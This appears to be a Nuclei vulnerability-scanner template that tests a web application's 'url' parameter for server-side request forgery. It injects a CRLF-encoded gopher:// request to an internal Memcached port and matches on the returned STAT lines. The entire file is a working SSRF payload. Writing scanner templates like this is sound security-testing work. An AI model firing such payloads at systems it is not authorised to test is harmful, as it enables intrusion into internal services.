id: gopher-memcached-dump
info:
  name: Memcached SSRF Dump via Gopher
  author: jakelo-ai
  severity: high
  description: Exploit SSRF to extract Memcached statistics.
  tags: ssrf,gopher,memcached,custom

http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=gopher://127.0.0.1:11211/_%0D%0Astats%0D%0Aquit%0D%0A"
    
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "STAT pid"
          - "STAT version"
          - "STAT uptime"
        condition: or
      - type: status
        status:
          - 200
